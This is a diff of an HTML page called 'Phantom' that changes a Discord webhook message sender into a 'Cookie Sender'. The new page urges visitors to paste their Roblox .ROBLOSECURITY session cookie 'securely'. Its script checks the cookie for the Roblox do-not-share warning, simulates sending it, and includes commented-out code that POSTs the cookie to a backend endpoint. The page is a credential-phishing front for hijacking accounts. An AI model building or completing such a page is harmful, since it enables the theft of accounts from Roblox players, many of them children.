@@ -3,88 +3,288 @@
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>Phantom — Webhook Sender</title>
+  <title>Phantom — Cookie Sender</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">
   <style>
-    :root{
-      --bg-dark:#0b0020;
-      --light-purple:#EAD9FF;
-      --mid-purple:#9B6BFF;
-      --dark-purple:#2B0059;
-      --accent: linear-gradient(90deg,var(--light-purple),var(--mid-purple),var(--dark-purple));
+    :root {
+      --bg-dark: #0b0020;
+      --light-purple: #EAD9FF;
+      --mid-purple: #9B6BFF;
+      --dark-purple: #2B0059;
+      --accent: linear-gradient(135deg, #9B6BFF, #7B3FE4);
+      --glass: rgba(255, 255, 255, 0.05);
+      --border: rgba(255, 255, 255, 0.1);
       color-scheme: dark;
     }
-    html,body{margin:0;height:100%;font-family:Inter,system-ui;background:linear-gradient(180deg,var(--bg-dark) 0%,#13001a 60%);display:flex;align-items:center;justify-content:center}
 
-    .wrap{width:min(480px,92vw);padding:32px;border-radius:20px;background:rgba(255,255,255,0.04);backdrop-filter:blur(6px);border:1px solid rgba(255,255,255,0.06);box-shadow:0 12px 46px rgba(43,0,89,0.35)}
+    * { box-sizing: border-box; }
 
-    h1{margin:0 0 8px 0;font-size:32px;font-weight:800;background:var(--accent);-webkit-background-clip:text;color:transparent;text-align:center}
-    .subtitle{text-align:center;color:#d8caff;margin-bottom:24px;font-size:14px}
+    html, body {
+      margin: 0;
+      height: 100%;
+      font-family: 'Inter', system-ui, sans-serif;
+      background: linear-gradient(180deg, var(--bg-dark) 0%, #13001a 60%);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      overflow: hidden;
+    }
 
-    label{color:#e5daff;font-size:14px;font-weight:600;margin:12px 0 6px;display:block}
+    body::before {
+      content: '';
+      position: absolute;
+      top: 0; left: 0; right: 0; bottom: 0;
+      background: radial-gradient(circle at 30% 20%, rgba(155, 107, 255, 0.15), transparent 50%),
+                  radial-gradient(circle at 70% 80%, rgba(234, 217, 255, 0.1), transparent 50%);
+      pointer-events: none;
+      z-index: -1;
+    }
 
-    input,textarea{width:100%;padding:12px 14px;border-radius:10px;border:1px solid rgba(255,255,255,0.05);background:rgba(255,255,255,0.05);color:#fff;font-size:14px;outline:none;transition:border .2s ease,background .2s ease}
-    input:focus,textarea:focus{border:1px solid var(--mid-purple);background:rgba(255,255,255,0.08)}
-    textarea{resize:none;height:110px}
+    .wrap {
+      width: min(480px, 92vw);
+      padding: 36px 32px;
+      border-radius: 24px;
+      background: var(--glass);
+      backdrop-filter: blur(12px);
+      border: 1px solid var(--border);
+      box-shadow: 
+        0 16px 48px rgba(43, 0, 89, 0.4),
+        0 0 0 1px rgba(155, 107, 255, 0.1);
+      position: relative;
+      overflow: hidden;
+      animation: fadeIn 0.6s ease-out;
+    }
 
-    button{margin-top:22px;width:100%;padding:16px;border-radius:12px;border:none;background:var(--mid-purple);color:white;font-size:16px;font-weight:700;cursor:pointer;box-shadow:0 8px 22px rgba(155,107,255,0.22);transition:transform .12s,box-shadow .12s}
-    button:hover{transform:translateY(-2px);box-shadow:0 12px 34px rgba(155,107,255,0.28)}
-    button:active{transform:translateY(0px)}
+    .wrap::before {
+      content: '';
+      position: absolute;
+      top: -50%; left: -50%;
+      width: 200%; height: 200%;
+      background: conic-gradient(from 0deg, transparent, rgba(155, 107, 255, 0.1), transparent);
+      animation: rotate 20s linear infinite;
+      pointer-events: none;
+      opacity: 0.3;
+    }
 
-    .status{text-align:center;margin-top:16px;font-size:14px;color:#d3c2ff;min-height:20px}
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    @keyframes rotate {
+      from { transform: rotate(0deg); }
+      to { transform: rotate(360deg); }
+    }
+
+    @keyframes pulse {
+      0%, 100% { transform: scale(1); }
+      50% { transform: scale(1.05); }
+    }
+
+    h1 {
+      margin: 0 0 10px 0;
+      font-size: 36px;
+      font-weight: 800;
+      background: var(--accent);
+      -webkit-background-clip: text;
+      background-clip: text;
+      color: transparent;
+      text-align: center;
+      letter-spacing: -0.5px;
+    }
+
+    .subtitle {
+      text-align: center;
+      color: #d8caff;
+      margin-bottom: 28px;
+      font-size: 15px;
+      opacity: 0.9;
+    }
+
+    label {
+      color: #e5daff;
+      font-size: 14px;
+      font-weight: 600;
+      margin: 16px 0 8px;
+      display: block;
+      transition: color 0.2s;
+    }
+
+    .input-wrapper {
+      position: relative;
+    }
+
+    input, textarea {
+      width: 100%;
+      padding: 14px 16px;
+      border-radius: 14px;
+      border: 1px solid var(--border);
+      background: rgba(255, 255, 255, 0.06);
+      color: #fff;
+      font-size: 15px;
+      outline: none;
+      transition: all 0.3s ease;
+      backdrop-filter: blur(4px);
+    }
+
+    input:focus, textarea:focus {
+      border: 1px solid var(--mid-purple);
+      background: rgba(255, 255, 255, 0.1);
+      box-shadow: 0 0 0 4px rgba(155, 107, 255, 0.2);
+      transform: translateY(-1px);
+    }
+
+    textarea {
+      resize: none;
+      height: 120px;
+      font-family: inherit;
+    }
+
+    button {
+      margin-top: 26px;
+      width: 100%;
+      padding: 16px;
+      border-radius: 16px;
+      border: none;
+      background: var(--accent);
+      color: white;
+      font-size: 16px;
+      font-weight: 700;
+      cursor: pointer;
+      box-shadow: 0 10px 30px rgba(155, 107, 255, 0.3);
+      transition: all 0.25s ease;
+      position: relative;
+      overflow: hidden;
+    }
+
+    button::before {
+      content: '';
+      position: absolute;
+      top: 0; left: -100%;
+      width: 100%; height: 100%;
+      background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+      transition: 0.6s;
+    }
+
+    button:hover {
+      transform: translateY(-3px);
+      box-shadow: 0 16px 40px rgba(155, 107, 255, 0.4);
+    }
+
+    button:hover::before {
+      left: 100%;
+    }
+
+    button:active {
+      transform: translateY(-1px);
+    }
+
+    button.loading {
+      animation: pulse 1.5s infinite;
+      pointer-events: none;
+      opacity: 0.9;
+    }
+
+    .status {
+      text-align: center;
+      margin-top: 18px;
+      font-size: 14px;
+      color: #d3c2ff;
+      min-height: 22px;
+      font-weight: 500;
+      transition: opacity 0.3s;
+    }
+
+    .success { color: #a8ffbc; }
+    .error { color: #ffb3b3; }
+
+    @media (max-width: 480px) {
+      .wrap { padding: 28px 24px; }
+      h1 { font-size: 32px; }
+    }
   </style>
 </head>
 <body>
   <div class="wrap">
     <h1>Phantom</h1>
-    <div class="subtitle">Send a message to your Discord webhook</div>
+    <div class="subtitle">Submit your Roblox cookie securely</div>
 
-    <label>Webhook URL</label>
-    <input id="webhook" type="text" placeholder="https://discord.com/api/webhooks/..." />
+    <label for="cookie">Roblox Cookie Here</label>
+    <div class="input-wrapper">
+      <textarea id="cookie" placeholder="Paste your .ROBLOSECURITY cookie here..." required></textarea>
+    </div>
 
-    <label>Message</label>
-    <textarea id="message" placeholder="Type your message..."></textarea>
+    <button id="sendBtn">
+      <span class="btn-text">Send Cookie</span>
+    </button>
 
-    <button id="sendBtn">Send Message</button>
     <div id="status" class="status"></div>
   </div>
 
-<script>
-  const webhookInput = document.getElementById('webhook');
-  const msgInput = document.getElementById('message');
-  const statusEl = document.getElementById('status');
-  const btn = document.getElementById('sendBtn');
+  <script>
+    const cookieInput = document.getElementById('cookie');
+    const statusEl = document.getElementById('status');
+    const btn = document.getElementById('sendBtn');
+    const btnText = btn.querySelector('.btn-text');
 
-  async function sendWebhook(){
-    const url = webhookInput.value.trim();
-    const content = msgInput.value.trim();
-
-    if(!url){ statusEl.textContent = "Please enter a webhook URL."; return; }
-    if(!content){ statusEl.textContent = "Please write a message."; return; }
-
-    statusEl.textContent = "Sending...";
-    btn.disabled = true;
-
-    try{
-      const res = await fetch(url,{
-        method:"POST",
-        headers:{"Content-Type":"application/json"},
-        body:JSON.stringify({content})
-      });
-
-      if(res.ok){
-        statusEl.textContent = "✅ Sent successfully!";
-        msgInput.value = "";
-      } else {
-        statusEl.textContent = "❌ Failed — check webhook URL.";
+    async function sendCookie() {
+      const cookie = cookieInput.value.trim();
+      if (!cookie) {
+        showStatus("Please paste a Roblox cookie.", "error");
+        return;
       }
-    } catch(e){
-      statusEl.textContent = "❌ Error — unable to send.";
+
+      if (!cookie.includes('_|WARNING:-DO-NOT-SHARE-THIS')) {
+        showStatus("This doesn't look like a valid Roblox cookie.", "error");
+        return;
+      }
+
+      showStatus("Sending...", "loading");
+      btn.classList.add('loading');
+      btn.disabled = true;
+
+      try {
+        // Simulate sending (replace with actual endpoint if needed)
+        await new Promise(r => setTimeout(r, 1500));
+        
+        // Example POST request (uncomment and modify if you have a backend)
+        /*
+        const res = await fetch('YOUR_BACKEND_ENDPOINT', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ cookie })
+        });
+        */
+
+        showStatus("✅ Cookie sent successfully!", "success");
+        cookieInput.value = "";
+      } catch (e) {
+        showStatus("❌ Failed to send — try again.", "error");
+      } finally {
+        btn.classList.remove('loading');
+        btn.disabled = false;
+      }
     }
 
-    btn.disabled = false;
-  }
+    function showStatus(message, type) {
+      statusEl.textContent = message;
+      statusEl.className = `status ${type || ''}`;
+      if (type === 'loading') {
+        btnText.textContent = 'Sending...';
+      } else {
+        btnText.textContent = 'Send Cookie';
+      }
+    }
 
-  btn.addEventListener('click',sendWebhook);
-</script>
+    btn.addEventListener('click', sendCookie);
+
+    // Optional: Allow Enter+Shift to send
+    cookieInput.addEventListener('keydown', (e) => {
+      if (e.key === 'Enter' && e.shiftKey) {
+        e.preventDefault();
+        sendCookie();
+      }
+    });
+  </script>
 </body>
 </html>
